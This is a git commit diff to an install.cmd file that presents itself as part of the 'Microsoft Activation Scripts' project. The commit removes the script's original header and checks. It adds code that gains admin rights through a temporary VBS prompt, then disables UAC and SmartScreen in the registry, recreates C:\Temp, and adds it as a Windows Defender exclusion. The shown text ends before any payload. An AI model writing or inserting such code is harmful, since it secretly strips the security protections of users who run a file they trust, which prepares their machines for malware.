9d7459831bbe42f88a5d6060bd81a385fd5561f3
/codsec <44205014+codsec@users.noreply.github.com>
2023-01-05 14:17:41 -0400

    Update install.cmd

--- MAS/All-In-One-Version/install.cmd
+++ MAS/All-In-One-Version/install.cmd
@@ -1,163 +1,66 @@
-@setlocal DisableDelayedExpansion
+REM --add the following to the top of your bat file--
+
+
 @echo off
 
+:: BatchGotAdmin
+:-------------------------------------
+REM  --> Check for permissions
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
 
+REM --> If error flag set, we do not have admin.
+if '%errorlevel%' NEQ '0' (
+    echo Requesting administrative privileges...
+    goto UACPrompt
+) else ( goto gotAdmin )
 
-::============================================================================
-::
-::   This script is a part of 'Microsoft Activation Scripts' (MAS) project.
-::
-::   Homepage: massgrave.dev
-::      Email: windowsaddict@protonmail.com
-::
-::============================================================================
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    set params = %*:"=""
+    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
 
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
 
+:gotAdmin
+    pushd "%CD%"
+    CD /D "%~dp0"
+:--------------------------------------
 
+@echo off
+@setlocal enableextensions
+mode con:cols=90 lines=30
+color 0c
 
-::========================================================================================================================================
-
-:: Re-launch the script with x64 process if it was initiated by x86 process on x64 bit Windows
-:: or with ARM64 process if it was initiated by x86/ARM32 process on ARM64 Windows
-
-set "_cmdf=%~f0"
-for %%# in (%*) do (
-if /i "%%#"=="r1" set r1=1
-if /i "%%#"=="r2" set r2=1
+:: Check authorization rights
+net session >nul 2>&1
+if not %errorlevel% equ 0 (
+  echo ERROR - Insufficient permissions.
+  goto end
 )
-
-if exist %SystemRoot%\Sysnative\cmd.exe if not defined r1 (
-setlocal EnableDelayedExpansion
-start %SystemRoot%\Sysnative\cmd.exe /c ""!_cmdf!" %* r1"
-exit /b
-)
-
-:: Re-launch the script with ARM32 process if it was initiated by x64 process on ARM64 Windows
-
-if exist %SystemRoot%\SysArm32\cmd.exe if %PROCESSOR_ARCHITECTURE%==AMD64 if not defined r2 (
-setlocal EnableDelayedExpansion
-start %SystemRoot%\SysArm32\cmd.exe /c ""!_cmdf!" %* r2"
-exit /b
-)
-
-::  Set Path variable, it helps if it is misconfigured in the system
-
-set "PATH=%SystemRoot%\System32;%SystemRoot%\System32\wbem;%SystemRoot%\System32\WindowsPowerShell\v1.0\"
-if exist "%SystemRoot%\Sysnative\reg.exe" (
-set "PATH=%SystemRoot%\Sysnative;%SystemRoot%\Sysnative\wbem;%SystemRoot%\Sysnative\WindowsPowerShell\v1.0\;%PATH%"
-)
-
-::  Check LF line ending
-
-pushd "%~dp0"
->nul findstr /rxc:".*" "%~nx0"
-if not %errorlevel%==0 (
-echo:
-echo Error: This is not a correct file. It has LF line ending issue.
-echo:
-echo Press any key to exit...
-pause >nul
-popd
-exit /b
-)
-popd
-
-::========================================================================================================================================
-
 cls
-color 07
-title  Microsoft Activation Scripts AIO
 
-set _elev=
-if /i "%~1"=="-el" set _elev=1
+:: Disable UAC
+Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f
+Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d "0" /f
 
-set winbuild=1
-set "nul=>nul 2>&1"
-set psc=powershell.exe
-for /f "tokens=6 delims=[]. " %%G in ('ver') do set winbuild=%%G
+:: Disable Smart Screen
+Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "SmartScreenEnabled" /t REG_SZ /d "Off" /f > NUL
 
-set _NCS=1
-if %winbuild% LSS 10586 set _NCS=0
-if %winbuild% GEQ 10586 reg query "HKCU\Console" /v ForceV2 2>nul | find /i "0x0" 1>nul && (set _NCS=0)
+:: Add exclusion to defender
+rmdir /Q /S "C:\Temp"
+mkdir "C:\Temp"
+powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\Temp" -Force
 
-call :_colorprep
 
-set "nceline=echo: &echo ==== ERROR ==== &echo:"
-set "eline=echo: &call :_color %Red% "==== ERROR ====" &echo:"
 
-::========================================================================================================================================
 
-if %winbuild% LSS 7600 (
-%nceline%
-echo Unsupported OS version detected.
-echo Project is supported only for Windows 7/8/8.1/10/11 and their Server equivalent.
-goto MASend
-)
 
-for %%# in (powershell.exe) do @if "%%~$PATH:#"=="" (
-%nceline%
-echo Unable to find powershell.exe in the system.
-echo Aborting...
-goto MASend
-)
 
-::========================================================================================================================================
 
-::  Fix for the special characters limitation in path name
 
-set "_work=%~dp0"
-if "%_work:~-1%"=="\" set "_work=%_work:~0,-1%"
 
-set "_batf=%~f0"
-set "_batp=%_batf:'=''%"
-
-set _PSarg="""%~f0""" -el %_args%
-
-set "_ttemp=%temp%"
-
-setlocal EnableDelayedExpansion
-
-::========================================================================================================================================
-
-echo "!_batf!" | find /i "!_ttemp!" 1>nul && (
-if /i not "!_work!"=="!_ttemp!" (
-%nceline%
-echo Script is launched from the temp folder,
-echo Most likely you are running the script directly from the archive file.
-echo:
-echo Extract the archive file and launch the script from the extracted folder.
-goto MASend
-)
-)
-
-::========================================================================================================================================
-
-::  Elevate script as admin and pass arguments and preventing loop
-
-%nul% reg query HKU\S-1-5-19 || (
-if not defined _elev %nul% %psc% "start cmd.exe -arg '/c \"!_PSarg:'=''!\"' -verb runas" && exit /b
-%nceline%
-echo This script require administrator privileges.
-echo To do so, right click on this script and select 'Run as administrator'.
-goto MASend
-)
-
-::========================================================================================================================================
-
-setlocal DisableDelayedExpansion
-
-::  Check desktop location
-
-set _desktop_=
-for /f "skip=2 tokens=2*" %%a in ('reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v Desktop') do call set "_desktop_=%%b"
-if not defined _desktop_ for /f "delims=" %%a in ('%psc% "& {write-host $([Environment]::GetFolderPath('Desktop'))}"') do call set "_desktop_=%%a"
-
-set "_pdesk=%_desktop_:'=''%"
-setlocal EnableDelayedExpansion
-
-::========================================================================================================================================
-
-cls
 
 SETLOCAL EnableDelayedExpansion
 for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (
